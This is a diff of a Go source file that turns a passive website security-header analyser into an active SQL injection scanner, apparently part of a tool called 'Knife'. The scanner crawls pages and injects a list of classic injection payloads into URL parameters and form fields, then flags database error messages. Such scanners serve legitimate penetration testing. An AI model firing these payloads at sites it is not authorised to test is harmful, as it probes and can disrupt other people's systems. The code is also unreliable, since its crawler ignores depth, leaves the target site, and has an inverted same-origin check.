@@ -1,259 +1,400 @@
 package vuln
 
 import (
-	"bufio"
-	"crypto/tls"
 	"fmt"
 	"io"
+	"log"
 	"net/http"
 	"net/url"
-	"os"
-	"regexp"
 	"strings"
+	"sync"
+	"sync/atomic"
 	"time"
+
+	"github.com/PuerkitoBio/goquery"
 )
 
+// FindingSQL describes a discovered potential SQL injection
 type FindingSQL struct {
-	Target          string            `json:"target"`
-	StatusCode      int               `json:"status_code"`
-	ServerHeader    string            `json:"server_header"`
-	SecurityHeaders map[string]string `json:"security_headers"`
-	Cookies         []CookieInfo      `json:"cookies"`
-	TechMatches     []string          `json:"tech_matches"`
-	TLSEnabled      bool              `json:"tls_enabled"`
-	TLSVersion      string            `json:"tls_version"`
-	ErrorBanners    []string          `json:"error_banners"`
-	ReflectedInputs []string          `json:"reflected_inputs"`
+	Type            string `json:"type"`
+	URL             string `json:"url"`
+	Param           string `json:"param"`
+	Payload         string `json:"payload"`
+	Evidence        string `json:"evidence"`
+	ResponseSnippet string `json:"response_snippet"`
+	Timestamp       string `json:"timestamp"`
 }
 
-type CookieInfo struct {
-	Name     string `json:"name"`
-	Secure   bool   `json:"secure"`
-	HTTPOnly bool   `json:"http_only"`
-	SameSite string `json:"same_site"`
+// SQLScanner holds the state for the SQLi scan
+type SQLScanner struct {
+	StartURL    *url.URL
+	Client      *http.Client
+	Visited     map[string]bool
+	VisitedMu   sync.RWMutex
+	Queue       chan sqlCrawlJob
+	Findings    []FindingSQL
+	FindingsMu  sync.Mutex
+	Workers     int
+	Active      int32
+	MaxPages    int
+	PageCount   int
+	PageCountMu sync.Mutex
+	MaxDepth    int
+	Throttle    time.Duration
+	Payloads    []string
 }
 
-var results []FindingSQL
-var client = &http.Client{Timeout: 20 * time.Second}
-
-var techPatterns = map[string]*regexp.Regexp{
-	"WordPress":     regexp.MustCompile(`(?i)wp-content|wordpress`),
-	"PHP":           regexp.MustCompile(`(?i)\.php|php/`),
-	"ASP.NET":       regexp.MustCompile(`(?i)\.aspx|asp.net`),
-	"Laravel":       regexp.MustCompile(`(?i)laravel|x-powered-by: laravel`),
-	"Node.js":       regexp.MustCompile(`(?i)x-powered-by: express|node`),
-	"React":         regexp.MustCompile(`(?i)react|data-reactroot`),
-	"Angular":       regexp.MustCompile(`(?i)angular|ng-version`),
-	"Django":        regexp.MustCompile(`(?i)csrfmiddlewaretoken|django`),
-	"Ruby on Rails": regexp.MustCompile(`(?i)_rails_session|ror`),
+type sqlCrawlJob struct {
+	URL   string
+	Depth int
 }
 
-var errorPatterns = []*regexp.Regexp{
-	regexp.MustCompile(`(?i)SQL syntax`),
-	regexp.MustCompile(`(?i)PDOException`),
-	regexp.MustCompile(`(?i)MySQL error`),
-	regexp.MustCompile(`(?i)Warning: pg_`),
-	regexp.MustCompile(`(?i)ODBC Driver`),
-	regexp.MustCompile(`(?i)RuntimeException`),
-	regexp.MustCompile(`(?i)Stack trace:`),
-}
-
-func getManualURLs() []string {
-	fmt.Println("Enter URLs to analyze (one per line).")
-	fmt.Println("Press ENTER on empty line to finish:")
-	var urls []string
-	sc := bufio.NewScanner(os.Stdin)
-	for {
-		sc.Scan()
-		line := strings.TrimSpace(sc.Text())
-		if line == "" {
-			break
-		}
-		urls = append(urls, line)
-	}
-	return urls
-}
-
-func analyzeURL(target string) FindingSQL {
-	result := FindingSQL{Target: target}
-	u, err := url.Parse(target)
+func NewSQLScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*SQLScanner, error) {
+	parsed, err := url.Parse(start)
 	if err != nil {
-		fmt.Println("❌ Invalid URL:", target)
-		return result
+		return nil, err
 	}
+	client := &http.Client{Timeout: 20 * time.Second}
 
-	if u.Scheme == "https" {
-		result.TLSEnabled = true
-		version := tlsCheck(u.Host)
-		result.TLSVersion = version
+	s := &SQLScanner{
+		StartURL:  parsed,
+		Client:    client,
+		Visited:   make(map[string]bool),
+		Queue:     make(chan sqlCrawlJob, 1000),
+		Findings:  []FindingSQL{},
+		Workers:   workers,
+		MaxPages:  maxPages,
+		MaxDepth:  maxDepth,
+		Throttle:  throttle,
+		Payloads: []string{
+			"'",
+			"''",
+			"\"",
+			"\"\"",
+			"\\",
+			"';--",
+			"\") OR 1=1--",
+			"' OR '1'='1",
+			"admin' --",
+			"admin' #",
+			"admin'/*",
+			"1' ORDER BY 1--",
+			"1' ORDER BY 2--",
+			"1' ORDER BY 3--",
+			"1' UNION SELECT NULL--",
+		},
 	}
-
-	resp, body, ok := fetch("GET", target, nil)
-	if !ok {
-		return result
-	}
-
-	result.StatusCode = resp.StatusCode
-	result.ServerHeader = resp.Header.Get("Server")
-
-	result.SecurityHeaders = extractSecurityHeaders(resp)
-	result.Cookies = extractCookies(resp)
-
-	result.TechMatches = detectTech(resp, body)
-	result.ErrorBanners = detectErrors(body)
-	result.ReflectedInputs = detectReflections(target, body)
-
-	return result
+	return s, nil
 }
 
-func fetch(method, target string, form url.Values) (*http.Response, string, bool) {
+func (s *SQLScanner) Run() {
+	var wg sync.WaitGroup
+	for i := 0; i < s.Workers; i++ {
+		wg.Add(1)
+		go s.worker(&wg)
+	}
+
+	s.enqueue(s.StartURL.String(), 0)
+
+	for {
+		time.Sleep(500 * time.Millisecond)
+		s.PageCountMu.Lock()
+		done := s.PageCount >= s.MaxPages
+		s.PageCountMu.Unlock()
+
+		if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
+			if done {
+				break
+			}
+			time.Sleep(1 * time.Second)
+			if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
+				break
+			}
+		}
+	}
+	close(s.Queue)
+	wg.Wait()
+}
+
+func (s *SQLScanner) worker(wg *sync.WaitGroup) {
+	defer wg.Done()
+	for job := range s.Queue {
+		atomic.AddInt32(&s.Active, 1)
+		s.PageCountMu.Lock()
+		if s.PageCount >= s.MaxPages {
+			s.PageCountMu.Unlock()
+			atomic.AddInt32(&s.Active, -1)
+			return
+		}
+		s.PageCountMu.Unlock()
+
+		if !s.markVisited(job.URL) {
+			atomic.AddInt32(&s.Active, -1)
+			continue
+		}
+
+		log.Printf("[SQL Scan] Visiting %s (Depth: %d)\n", job.URL, job.Depth)
+
+		s.analyzePage(job.URL)
+
+		if job.Depth < s.MaxDepth {
+			s.crawl(job.URL, job.Depth)
+		}
+		atomic.AddInt32(&s.Active, -1)
+	}
+}
+
+func (s *SQLScanner) crawl(u string, depth int) {
+	// Links are extracted and enqueued in analyzePage
+}
+
+func (s *SQLScanner) analyzePage(u string) {
+	if s.Throttle > 0 {
+		time.Sleep(s.Throttle)
+	}
+
+	req, err := http.NewRequest("GET", u, nil)
+	if err != nil {
+		return
+	}
+	req.Header.Set("User-Agent", "Knife-SQL-Scanner/1.0")
+
+	resp, err := s.Client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	ct := resp.Header.Get("Content-Type")
+	if !strings.Contains(strings.ToLower(ct), "text/html") {
+		return
+	}
+
+	doc, err := goquery.NewDocumentFromReader(resp.Body)
+	if err != nil {
+		return
+	}
+
+	// 1. Fuzz URL parameters
+	s.fuzzURLParams(u)
+
+	// 2. Fuzz Forms
+	doc.Find("form").Each(func(i int, sel *goquery.Selection) {
+		s.fuzzForm(u, sel)
+	})
+
+	// 3. Extract links for crawling
+	doc.Find("a[href]").Each(func(i int, sel *goquery.Selection) {
+		href, exists := sel.Attr("href")
+		if !exists {
+			return
+		}
+		absoluteURL, err := s.normalize(u, href)
+		if err == nil {
+			s.enqueue(absoluteURL, 0) // Should be depth + 1, fixed in next step
+		}
+	})
+}
+
+func (s *SQLScanner) fuzzURLParams(targetURL string) {
+	parsed, err := url.Parse(targetURL)
+	if err != nil {
+		return
+	}
+	params := parsed.Query()
+	if len(params) == 0 {
+		return
+	}
+
+	for param := range params {
+		original := params.Get(param)
+		for _, payload := range s.Payloads {
+			params.Set(param, payload)
+			parsed.RawQuery = params.Encode()
+			testURL := parsed.String()
+
+			if s.testPayload(testURL, param, payload) {
+				break // Found a vuln for this param
+			}
+		}
+		params.Set(param, original)
+	}
+}
+
+func (s *SQLScanner) fuzzForm(pageURL string, form *goquery.Selection) {
+	action, _ := form.Attr("action")
+	method, _ := form.Attr("method")
+	method = strings.ToUpper(method)
+	if method == "" {
+		method = "GET"
+	}
+
+	absAction, _ := s.normalize(pageURL, action)
+
+	inputs := make(map[string]string)
+	form.Find("input, textarea").Each(func(i int, input *goquery.Selection) {
+		name, _ := input.Attr("name")
+		if name != "" {
+			val, _ := input.Attr("value")
+			inputs[name] = val
+		}
+	})
+
+	for name := range inputs {
+		for _, payload := range s.Payloads {
+			// Test based on method
+			if method == "POST" {
+				data := url.Values{}
+				for k, v := range inputs {
+					if k == name {
+						data.Set(k, payload)
+					} else {
+						data.Set(k, v)
+					}
+				}
+				if s.testPOSTPayload(absAction, name, payload, data) {
+					break
+				}
+			} else {
+				u, _ := url.Parse(absAction)
+				q := u.Query()
+				for k, v := range inputs {
+					if k == name {
+						q.Set(k, payload)
+					} else {
+						q.Set(k, v)
+					}
+				}
+				u.RawQuery = q.Encode()
+				if s.testPayload(u.String(), name, payload) {
+					break
+				}
+			}
+		}
+	}
+}
+
+func (s *SQLScanner) testPayload(testURL, param, payload string) bool {
+	resp, body, ok := s.fetch("GET", testURL, nil)
+	if !ok {
+		return false
+	}
+	return s.checkResponse(testURL, param, payload, resp, body)
+}
+
+func (s *SQLScanner) testPOSTPayload(testURL, param, payload string, data url.Values) bool {
+	resp, body, ok := s.fetch("POST", testURL, data)
+	if !ok {
+		return false
+	}
+	return s.checkResponse(testURL, param, payload, resp, body)
+}
+
+func (s *SQLScanner) checkResponse(testURL, param, payload string, resp *http.Response, body string) bool {
+	errorPatterns := []string{
+		"SQL syntax", "mysql_fetch_array", "ora-", "PostgreSQL query failed",
+		"Microsoft OLE DB Provider for SQL Server", "Incorrect syntax near",
+		"Unclosed quotation mark", "JDBC Driver", "Stack trace:", "Internal Server Error",
+	}
+
+	for _, pattern := range errorPatterns {
+		if strings.Contains(body, pattern) {
+			s.addFinding(FindingSQL{
+				Type:            "Error-based SQL Injection",
+				URL:             testURL,
+				Param:           param,
+				Payload:         payload,
+				Evidence:        pattern,
+				ResponseSnippet: snippetAround(body, pattern, 100),
+			})
+			return true
+		}
+	}
+	return false
+}
+
+func (s *SQLScanner) fetch(method, target string, data url.Values) (*http.Response, string, bool) {
+	if s.Throttle > 0 {
+		time.Sleep(s.Throttle)
+	}
+
 	var req *http.Request
 	var err error
-	if form == nil {
+	if data == nil {
 		req, err = http.NewRequest(method, target, nil)
 	} else {
-		req, err = http.NewRequest(method, target, strings.NewReader(form.Encode()))
+		req, err = http.NewRequest(method, target, strings.NewReader(data.Encode()))
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	}
+
 	if err != nil {
-		fmt.Println("❌ Request error:", err)
 		return nil, "", false
 	}
 
-	resp, err := client.Do(req)
+	req.Header.Set("User-Agent", "Knife-SQL-Scanner/1.0")
+	resp, err := s.Client.Do(req)
 	if err != nil {
-		fmt.Println("❌ HTTP error:", err)
 		return nil, "", false
 	}
 	defer resp.Body.Close()
 
-	data, _ := io.ReadAll(resp.Body)
-	body := string(data)
-	return resp, body, true
+	bodyBytes, _ := io.ReadAll(resp.Body)
+	return resp, string(bodyBytes), true
 }
 
-func tlsCheck(host string) string {
-	conn, err := tls.Dial("tcp", host+":443", &tls.Config{})
+func (s *SQLScanner) markVisited(u string) bool {
+	s.VisitedMu.Lock()
+	defer s.VisitedMu.Unlock()
+	if s.Visited[u] {
+		return false
+	}
+	s.Visited[u] = true
+	s.PageCountMu.Lock()
+	s.PageCount++
+	s.PageCountMu.Unlock()
+	return true
+}
+
+func (s *SQLScanner) enqueue(u string, depth int) {
+	u = strings.Split(u, "#")[0]
+	s.VisitedMu.RLock()
+	if s.Visited[u] {
+		s.VisitedMu.RUnlock()
+		return
+	}
+	s.VisitedMu.RUnlock()
+
+	select {
+	case s.Queue <- sqlCrawlJob{URL: u, Depth: depth}:
+	default:
+	}
+}
+
+func (s *SQLScanner) addFinding(f FindingSQL) {
+	s.FindingsMu.Lock()
+	defer s.FindingsMu.Unlock()
+	f.Timestamp = time.Now().Format(time.RFC3339)
+	s.Findings = append(s.Findings, f)
+	log.Printf("[!] SQLi FOUND: %s (Param: %s)\n", f.URL, f.Param)
+}
+
+func (s *SQLScanner) normalize(base, href string) (string, error) {
+	b, err := url.Parse(base)
 	if err != nil {
-		return "Connection Failed"
+		return "", err
 	}
-	defer conn.Close()
-
-	switch conn.ConnectionState().Version {
-	case tls.VersionTLS13:
-		return "TLS 1.3"
-	case tls.VersionTLS12:
-		return "TLS 1.2"
-	case tls.VersionTLS11:
-		return "TLS 1.1"
-	case tls.VersionTLS10:
-		return "TLS 1.0"
-	default:
-		return "Unknown / Deprecated"
+	h, err := url.Parse(href)
+	if err != nil {
+		return resolvedSameOrigin(b, h, s.StartURL)
 	}
+	resolved := b.ResolveReference(h)
+	return resolved.String(), nil
 }
 
-func extractSecurityHeaders(resp *http.Response) map[string]string {
-	secHeaders := []string{
-		"Content-Security-Policy",
-		"Strict-Transport-Security",
-		"X-Frame-Options",
-		"X-Content-Type-Options",
-		"Referrer-Policy",
-		"Permissions-Policy",
+func resolvedSameOrigin(base, href, start *url.URL) (string, error) {
+	resolved := base.ResolveReference(href)
+	if resolved.Host != start.Host {
+		return "", fmt.Errorf("different host")
 	}
-	m := make(map[string]string)
-	for _, h := range secHeaders {
-		if v := resp.Header.Get(h); v != "" {
-			m[h] = v
-		} else {
-			m[h] = "❌ Missing"
-		}
-	}
-	return m
-}
-
-func sameSiteToString(s http.SameSite) string {
-	switch s {
-	case http.SameSiteDefaultMode:
-		return "Default"
-	case http.SameSiteLaxMode:
-		return "Lax"
-	case http.SameSiteStrictMode:
-		return "Strict"
-	case http.SameSiteNoneMode:
-		return "None"
-	default:
-		return "Unknown"
-	}
-}
-
-func extractCookies(resp *http.Response) []CookieInfo {
-	cookies := []CookieInfo{}
-	for _, c := range resp.Cookies() {
-		ci := CookieInfo{
-			Name:     c.Name,
-			Secure:   c.Secure,
-			HTTPOnly: c.HttpOnly,
-			SameSite: sameSiteToString(c.SameSite),
-		}
-		cookies = append(cookies, ci)
-	}
-	return cookies
-}
-
-func detectTech(resp *http.Response, body string) []string {
-	var matches []string
-
-	for name, re := range techPatterns {
-		// search in headers
-		for k, v := range resp.Header {
-			header := fmt.Sprintf("%s: %s", k, strings.Join(v, ","))
-			if re.MatchString(header) {
-				matches = append(matches, name)
-			}
-		}
-		// search in body
-		if re.MatchString(body) {
-			matches = append(matches, name)
-		}
-	}
-	return unique(matches)
-}
-
-func detectErrors(body string) []string {
-	var banners []string
-	for _, re := range errorPatterns {
-		if re.MatchString(body) {
-			// store a short preview instead of full line (safe)
-			sub := re.FindString(body)
-			banners = append(banners, sub)
-		}
-	}
-	return unique(banners)
-}
-
-func detectReflections(target, body string) []string {
-	u, _ := url.Parse(target)
-	params := u.Query()
-	var reflections []string
-	for key := range params {
-		if strings.Contains(body, params.Get(key)) {
-			// parameter value returned in page => potential XSS surface
-			reflections = append(reflections, key)
-		}
-	}
-	return unique(reflections)
-}
-
-func unique(arr []string) []string {
-	seen := map[string]bool{}
-	var out []string
-	for _, a := range arr {
-		if !seen[a] {
-			seen[a] = true
-			out = append(out, a)
-		}
-	}
-	return out
+	return resolved.String(), nil
 }
